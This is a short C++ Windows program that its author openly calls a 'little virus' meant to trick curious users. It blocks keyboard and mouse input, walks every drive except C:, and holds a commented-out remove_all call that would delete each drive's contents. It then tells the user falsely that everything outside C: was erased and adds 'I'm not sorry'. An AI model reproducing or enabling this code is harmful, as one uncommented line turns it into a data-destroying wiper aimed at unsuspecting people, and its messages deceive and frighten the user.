#include <string>
#include <iostream>
#include <filesystem>
#include <Windows.h>



using namespace std;
namespace fs = filesystem;

int main() {
    string path = "F:\Test";
    // string that has all the alphabet letters but the C
    string alphabet = "ABDEFGHIJKLMNOPQRSTUVWXYZ";
    cout << "..........................................................................\n"
            "--------------------------------------------------------------------------\n"
            "||             ||   --------------   |         |           ----------  \n"
            "||             ||   ||               |         |         ||          ||\n"
            "||             ||   ||               |         |         ||          ||\n"
            "||-------------||   ||-------        |         |         ||          ||\n"
            "||-------------||   ||-------        |         |         ||          ||\n"
            "||             ||   ||               |         |         ||          ||\n"
            "||             ||   ||               |         |         ||          ||\n"
            "||             ||   --------------   -------   --------    ----------  \n"
            "--------------------------------------------------------------------------\n"
            ".........................................................................." << endl;
    cout << "This is a simple trickster program that deletes your eveything other than your system files!\n"
            "Something like a virus or something, I don't really know how to create an actual hidden virus yet\n"
            "so this is just a like a spam program that you or other people will use out of curiosity and it will scam them into deleting all of their files!" << endl;
    
    cout << "\nGetting files ..." << endl;
    
    for (int i = 0; i < alphabet.length(); i++) {
        SetCursorPos(0, 0);
        BlockInput(true);
        path = alphabet[i];
        path.append(":");
        if (fs::exists(path)) {
            for (const auto& entry : fs::directory_iterator(path)) {
                cout << "..." << endl;
                //fs::remove_all(entry);
            }
        }
    }
    
    BlockInput(false);
    cout << "Thank you for trying out my little virus!\n"
            "This virus deleted everything on your pc other than the files on your C: drive!\n"
            "Rate me later, enjoy your missing files for now!\n"
            "And I'm not sorry!" << endl;
    system("pause");
    return 0;
}
